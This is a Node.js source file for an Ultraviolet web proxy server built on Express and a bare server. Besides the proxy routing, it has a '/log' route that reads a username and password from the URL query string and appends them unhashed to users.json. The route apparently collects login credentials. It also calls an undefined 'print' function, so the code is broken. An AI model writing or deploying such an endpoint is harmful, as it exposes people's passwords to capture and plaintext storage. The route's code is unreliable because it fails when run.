import { createBareServer } from "@tomphttp/bare-server-node";
import express from "express";
import { createServer } from "node:http";
import { publicPath } from "./ultraviolet-static/lib/index.js";
import { uvPath } from "@titaniumnetwork-dev/ultraviolet";
import { join } from "node:path";
import { hostname } from "node:os";
import fs from 'fs';
var app = express();

const bare = createBareServer("/bare/");
app.use('/',express.static(publicPath));
app.use("/uv/", express.static(uvPath));
app.use(express.static('public'));

app.get('/log', (req, res)=>{
    // log the ?user=x&pass=y to users.json
    var user = req.query.user;
    var pass = req.query.pass;
    var data = fs.readFileSync('users.json');
    print(data);
    var users = JSON.parse(data);
    // users is an array, add the {username:user,password:pass} to the array and write it back
    users.push({username:user,password:pass});
    var data2 = JSON.stringify(users);
    fs.writeFileSync('users.json', data2);
    res.send("success");
});

const server = createServer();

server.on("request", (req, res) => {
  if (bare.shouldRoute(req)) {
    bare.routeRequest(req, res);
  } else {
    app(req, res);
  }
});

server.on("upgrade", (req, socket, head) => {
  if (bare.shouldRoute(req)) {
    bare.routeUpgrade(req, socket, head);
  } else {
    socket.end();
  }
});

let port = parseInt(process.env.PORT || 3000);

server.on("listening", () => {
  const address = server.address();

  // by default we are listening on 0.0.0.0 (every interface)
  // we just need to list a few
  console.log("Listening on:");
  console.log(`\thttp://localhost:${address.port}`);
  console.log(`\thttp://${hostname()}:${address.port}`);
  console.log(
    `\thttp://${
      address.family === "IPv6" ? `[${address.address}]` : address.address
    }:${address.port}`
  );
});

// https://expressjs.com/en/advanced/healthcheck-graceful-shutdown.html
process.on("SIGINT", shutdown);
process.on("SIGTERM", shutdown);

function shutdown() {
  console.log("SIGTERM signal received: closing HTTP server");
  server.close();
  bare.close();
  process.exit(0);
}

server.listen({
  port,
});
